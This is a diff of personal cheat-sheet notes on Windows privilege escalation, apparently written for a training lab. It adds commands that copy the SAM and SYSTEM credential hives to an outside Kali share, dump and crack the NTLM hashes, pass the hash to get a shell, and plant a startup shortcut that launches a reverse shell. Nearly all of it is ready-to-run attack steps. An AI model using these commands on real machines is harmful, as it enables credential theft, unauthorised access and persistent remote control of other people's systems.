@@ -1,4 +1,8 @@
-##SHERLOCK => https://github.com/sherlock-project/sherlock
+## SHERLOCK => https://github.com/sherlock-project/sherlock
+## winPEASany.exe => https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+## Seatbelt.exe => https://github.com/GhostPack/Seatbelt
+## PowerUp.ps1 => https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+## SharpUp.exe => https://github.com/GhostPack/SharpUp
 
 ##Service Exploits - Insecure Service Permissions
 1) Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service: C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc    
@@ -46,3 +50,31 @@ winexe -U 'admin%password' //[target host] cmd.exe
 1) List any saved credentials: cmdkey /list
 2) Start listener anr run our reverse.exe with user's saved credentials: runas /savecred /user:admin C:\PrivEsc\reverse.exe
 
+##Passwords - Security Account Manager (SAM)
+1) Transfer the SAM and SYSTEM files to your Kali VM:
+        copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
+        copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
+2) On kali machine:
+        git clone https://github.com/Tib3rius/creddump7
+        pip3 install pycrypto
+        python3 creddump7/pwdump.py SYSTEM SAM
+3) Crack the admin NTLM hash using hashcat: hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+
+## Passwords - Passing the Hash 
+1) pth-winexe -U 'admin%[LM:NTLM]' //10.10.72.161 cmd.exe
+
+## Scheduled Tasks
+
+## Insecure GUI Apps
+
+## Startup Apps
+1) Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
+        cscript C:\PrivEsc\CreateShortcut.vbs
+2) Содержимое CreateShortcut.vbs:
+        Set oWS = WScript.CreateObject("WScript.Shell")
+        sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+        Set oLink = oWS.CreateShortcut(sLinkFile)
+        oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+        oLink.Save
+
+## 
